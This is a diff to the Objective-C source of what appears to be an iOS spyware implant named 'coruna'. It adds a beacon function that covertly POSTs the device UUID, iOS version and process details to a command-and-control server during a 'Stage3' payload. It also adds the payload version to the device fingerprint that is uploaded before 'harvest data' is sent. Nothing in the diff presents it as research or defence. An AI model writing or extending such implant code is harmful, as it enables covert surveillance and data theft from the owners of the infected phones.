@@ -123,6 +123,73 @@ void upload_to_c2(const char *category, const char *path,
 }
 
 /* --------------------------------------------------------------------------
+ * upload_beacon — lightweight synchronous probe with 5-second timeout.
+ *
+ * Called synchronously from process() in Stage3's calling context before
+ * the background thread is spawned.  Serves two diagnostic purposes:
+ *   1. Confirms Foundation + NSURLSession are functional from within the dylib.
+ *   2. Embeds PAYLOAD_VERSION so the operator knows which binary is running.
+ *
+ * If this record appears in server logs  →  ObjC network path works ✓
+ * If this record is absent               →  crash or network failure before ObjC
+ * -------------------------------------------------------------------------- */
+void upload_beacon(void) {
+    @autoreleasepool {
+        NSString *scheme = C2_USE_HTTPS ? @"https" : @"http";
+        NSString *urlStr = [NSString stringWithFormat:@"%@://%s%s",
+                            scheme, C2_DOMAIN, C2_UPLOAD];
+        NSURL *url = [NSURL URLWithString:urlStr];
+        if (!url) return;
+
+        char ios_ver[64] = "?";
+        size_t vs = sizeof(ios_ver);
+        sysctlbyname("kern.osproductversion", ios_ver, &vs, NULL, 0);
+
+        NSString *uuid  = coruna_device_uuid();
+        NSString *desc  = [NSString stringWithFormat:
+                           @"beacon v" PAYLOAD_VERSION " ios=%s pid=%d proc=%s",
+                           ios_ver, (int)getpid(), getprogname() ?: "?"];
+
+        NSDictionary *bodyDict = @{
+            @"deviceUUID":  uuid,
+            @"category":    @"system",
+            @"path":        @"/coruna/beacon",
+            @"description": desc,
+            @"data":        @"",
+        };
+        NSData *body = [NSJSONSerialization dataWithJSONObject:bodyDict
+                                                       options:0 error:nil];
+        if (!body) return;
+
+        NSMutableURLRequest *req =
+            [NSMutableURLRequest requestWithURL:url
+                                    cachePolicy:NSURLRequestReloadIgnoringLocalCacheData
+                                timeoutInterval:5.0];     /* short: don't stall Stage3 */
+        [req setHTTPMethod:@"POST"];
+        [req setValue:@"application/json" forHTTPHeaderField:@"Content-Type"];
+        [req setValue:uuid forHTTPHeaderField:@"X-Device-UUID"];
+        [req setHTTPBody:body];
+
+        dispatch_semaphore_t sem = dispatch_semaphore_create(0);
+        NSURLSessionConfiguration *cfg =
+            [NSURLSessionConfiguration ephemeralSessionConfiguration];
+        cfg.timeoutIntervalForRequest  = 5.0;
+        cfg.timeoutIntervalForResource = 5.0;
+
+        NSURLSession *session = [NSURLSession sessionWithConfiguration:cfg];
+        [[session dataTaskWithRequest:req
+                    completionHandler:^(NSData *d, NSURLResponse *r, NSError *e) {
+            (void)d; (void)r; (void)e;
+            dispatch_semaphore_signal(sem);
+        }] resume];
+
+        dispatch_semaphore_wait(sem,
+            dispatch_time(DISPATCH_TIME_NOW, 5 * NSEC_PER_SEC));
+        [session invalidateAndCancel];
+    }
+}
+
+/* --------------------------------------------------------------------------
  * Device info — sent once on first contact so C2 can identify the device
  * before any harvest data arrives.
  * -------------------------------------------------------------------------- */
@@ -141,18 +208,19 @@ void upload_device_info(void) {
         sysctlbyname("kern.version", kern_ver, &ks, NULL, 0);
 
         NSDictionary *info = @{
-            @"machine":      @(un.machine),    /* e.g. "iPhone15,2" */
-            @"sysname":      @(un.sysname),    /* "Darwin" */
-            @"release":      @(un.release),    /* "23.2.0" */
-            @"ios_version":  @(ios_ver),       /* "17.2" */
-            @"kern_version": @(kern_ver),      /* full kern.version string */
+            @"version":      @(PAYLOAD_VERSION), /* dylib build version */
+            @"machine":      @(un.machine),      /* e.g. "iPhone15,2" */
+            @"sysname":      @(un.sysname),      /* "Darwin" */
+            @"release":      @(un.release),      /* "23.2.0" */
+            @"ios_version":  @(ios_ver),         /* "16.3" */
+            @"kern_version": @(kern_ver),        /* full kern.version string */
         };
 
         NSData *json  = [NSJSONSerialization dataWithJSONObject:info options:0 error:nil];
         if (!json) return;
         NSString *b64 = [json base64EncodedStringWithOptions:0];
         upload_to_c2("system", "/coruna/device_info",
-                     "Device identification", b64.UTF8String);
+                     "Device identification v" PAYLOAD_VERSION, b64.UTF8String);
     }
 }
 
